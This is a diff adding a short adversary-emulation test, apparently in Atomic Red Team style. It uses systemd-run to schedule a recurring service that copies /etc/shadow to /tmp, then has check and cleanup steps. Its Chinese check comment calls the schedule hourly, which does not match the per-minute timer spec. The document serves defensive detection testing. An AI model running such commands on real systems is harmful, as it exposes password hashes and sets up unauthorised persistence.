@@ -1,0 +1,10 @@
+Elevation Required;Waiting Required;
+#command
+systemd-run --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'cat /etc/shadow > /tmp/shadow'
+#check
+echo "使用systemd-run，以创建临时服务的方式执行cat /etc/shadow > /tmp/shadow，服务的运行计划为每小时运行一次："
+cat /tmp/shadow | head -n 3
+#cleanup
+systemctl stop Atomic-Red-Team.service
+systemctl stop Atomic-Red-Team.timer
+rm -f /tmp/shadow
